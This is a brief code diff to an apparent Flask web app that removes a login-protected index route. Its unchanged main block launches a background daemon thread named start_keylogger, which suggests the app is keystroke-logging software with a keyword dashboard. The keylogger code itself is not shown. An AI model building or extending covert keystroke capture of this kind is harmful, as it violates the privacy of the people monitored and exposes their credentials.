@@ -154,11 +154,6 @@ def delete_keyword(keyword):
         return jsonify({"status": "success"}), 200
     return jsonify({"status": "error", "message": "Not found"}), 404
 
-@app.route("/")
-@login_required
-def index():
-    return render_template("index.html")
-
 if __name__ == "__main__":
     t = threading.Thread(target=start_keylogger)
     t.daemon = True
